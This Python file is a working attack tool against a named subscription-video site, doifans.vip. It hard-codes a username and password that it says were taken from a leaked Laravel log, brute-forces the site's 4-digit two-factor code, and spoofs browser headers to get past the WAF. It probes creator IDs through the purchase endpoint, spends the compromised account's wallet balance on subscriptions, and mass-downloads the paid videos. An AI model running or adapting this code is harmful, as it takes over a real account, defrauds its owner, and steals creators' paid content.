"""DoiFans API client — 2FA brute + WAF bypass + subscription + video scraping."""

import re
import time
import random
import urllib.parse
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import urllib3

urllib3.disable_warnings()

BASE_URL = "https://doifans.vip"
CREDS = ("cncmeng", "123123")  # from laravel.log leak


class DoiFans:
    def __init__(self, base_url=BASE_URL, proxy=None):
        self.base = base_url
        self.s = requests.Session()
        self.s.verify = False
        if proxy:
            self.s.proxies = {"https": proxy, "http": proxy}

    def _headers(self, referer="/"):
        xsrf = urllib.parse.unquote(self.s.cookies.get("XSRF-TOKEN", ""))
        return {
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest",
            "Accept": "application/json",
            "Origin": "https://doifans.vip",
            "Referer": f"https://doifans.vip{referer}",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "X-XSRF-TOKEN": xsrf,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        }

    def login(self, max_attempts=10):
        """Login cncmeng + brute-force 4-digit 2FA. Returns True on success."""
        for attempt in range(max_attempts):
            self.s.cookies.clear()
            self.s.get(f"{self.base}/", timeout=10)
            h = self._headers("/login")
            r = self.s.post(f"{self.base}/login", headers=h,
                           json={"username_email": CREDS[0], "password": CREDS[1]}, timeout=10)
            if "actionRequired" not in r.text:
                continue

            # Brute force 4-digit 2FA code (rand(1000,9999), valid 2 min, no rate limit)
            codes = list(range(1000, 10000))
            random.shuffle(codes)
            start = time.time()
            for code in codes:
                if time.time() - start > 115:
                    break
                h["X-XSRF-TOKEN"] = urllib.parse.unquote(self.s.cookies.get("XSRF-TOKEN", ""))
                try:
                    r = self.s.post(f"{self.base}/verify/2fa", headers=h,
                                   json={"code": str(code)}, timeout=1.5)
                    if r.status_code == 200:
                        d = r.json()
                        if d.get("success"):
                            return True
                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                    pass
                except:
                    pass
        return False

    def resolve_creator_id(self, username):
        """Resolve creator username to numeric ID. Requires active session."""
        r = self.s.get(f"{self.base}/{username}", headers={"Accept": "text/html",
                       "User-Agent": "Mozilla/5.0"}, timeout=15)
        if r.status_code != 200:
            return None

        # Method 1: userId pattern in JS/HTML
        m = re.search(r'(?:userId|user_id|data-userid)["\s:=]+["\']?(\d{4,6})', r.text)
        if m:
            return m.group(1)

        # Method 2: from avatar/cover filename: username-{id}{timestamp}
        m = re.search(rf'/(?:avatar|cover)/{re.escape(username)}-(\d{{4,6}})', r.text)
        if m:
            return m.group(1)

        # Method 3: try subscribe with candidate IDs (returns "资金不足" for valid creators)
        candidates = set(re.findall(r'\b(\d{4,6})\b', r.text[:20000]))
        # Also add IDs from ajax/updates page
        r2 = self.s.get(f"{self.base}/ajax/updates",
                       headers={"X-Requested-With": "XMLHttpRequest"},
                       params={"id": "0", "skip": "0"}, timeout=10)
        # Extract from explore
        r3 = self.s.get(f"{self.base}/ajax/explore",
                       headers={"X-Requested-With": "XMLHttpRequest"}, timeout=10)
        if username in r3.text:
            # Find ID near username in explore HTML
            idx = r3.text.find(username)
            nearby = r3.text[max(0, idx-200):idx+200]
            nearby_ids = re.findall(r'\b(\d{4,6})\b', nearby)
            candidates.update(nearby_ids)

        # Test candidates via ajax/updates (returns content for valid creator IDs)
        for cid in sorted(candidates, key=int):
            try:
                r4 = self.s.get(f"{self.base}/ajax/updates",
                               headers={"X-Requested-With": "XMLHttpRequest"},
                               params={"id": cid, "skip": "0"}, timeout=5)
                if len(r4.text) > 5000 and username in r4.text:
                    return cid
            except:
                pass

        # Method 4: try /buy/subscription (returns 资金不足 for valid, 404 for invalid)
        h = self._headers(f"/{username}")
        for cid in sorted(candidates, key=int):
            try:
                r5 = self.s.post(f"{self.base}/buy/subscription", headers=h,
                               json={"id": cid, "interval": "monthly",
                                     "payment_gateway": "wallet", "agree_terms": "1"},
                               timeout=5)
                if r5.status_code == 200 and "资金不足" in r5.text:
                    return cid
            except:
                pass
        return None

    def subscribe(self, creator_id):
        """Subscribe to a creator using wallet balance."""
        h = self._headers(f"/{creator_id}")
        r = self.s.post(f"{self.base}/buy/subscription", headers=h,
                       json={"id": str(creator_id), "interval": "monthly",
                             "payment_gateway": "wallet", "agree_terms": "1"},
                       timeout=15)
        try:
            data = r.json()
            if data.get("success"):
                return True
            # Already subscribed
            if "already" in str(data).lower() or "活跃" in str(data):
                return True
        except:
            pass
        return False

    def scrape_videos(self, creator_username, creator_id):
        """Scrape all video URLs for a creator."""
        all_videos = set()
        for skip in range(0, 500, 5):
            xsrf = urllib.parse.unquote(self.s.cookies.get("XSRF-TOKEN", ""))
            r = self.s.get(f"{self.base}/ajax/updates",
                         headers={"X-Requested-With": "XMLHttpRequest",
                                  "X-XSRF-TOKEN": xsrf, "User-Agent": "Mozilla/5.0"},
                         params={"id": str(creator_id), "skip": str(skip)},
                         timeout=15)
            mp4s = re.findall(r'https?://[^\s"\'<>]+\.mp4', r.text)
            new = set(mp4s) - all_videos
            all_videos.update(mp4s)
            if not new or len(r.text) < 1000:
                break
        return sorted(all_videos)

    def download_videos(self, urls, output_dir, workers=5):
        """Download videos (no auth needed - static files)."""
        dest = Path(output_dir)
        dest.mkdir(parents=True, exist_ok=True)
        results = []

        def _dl(url):
            name = url.split("/")[-1]
            path = dest / name
            if path.exists():
                return {"file": str(path), "status": "skip", "size": path.stat().st_size}
            r = requests.get(url, verify=False, timeout=300, stream=True)
            if r.status_code == 200:
                with open(path, "wb") as f:
                    for chunk in r.iter_content(1024 * 1024):
                        f.write(chunk)
                return {"file": str(path), "status": "ok", "size": path.stat().st_size}
            return {"file": str(path), "status": "failed", "http": r.status_code}

        with ThreadPoolExecutor(max_workers=workers) as pool:
            futures = {pool.submit(_dl, url): url for url in urls}
            for f in as_completed(futures):
                results.append(f.result())
        return results

    def doctor(self):
        """Check if the exploit chain works."""
        self.s.get(f"{self.base}/", timeout=10)
        h = self._headers("/login")
        r = self.s.post(f"{self.base}/login", headers=h,
                       json={"username_email": CREDS[0], "password": CREDS[1]}, timeout=10)
        if "actionRequired" in r.text:
            return {"auth": "ok_needs_2fa", "proxy": self.s.proxies or "none"}
        return {"auth": "fail", "proxy": self.s.proxies or "none"}
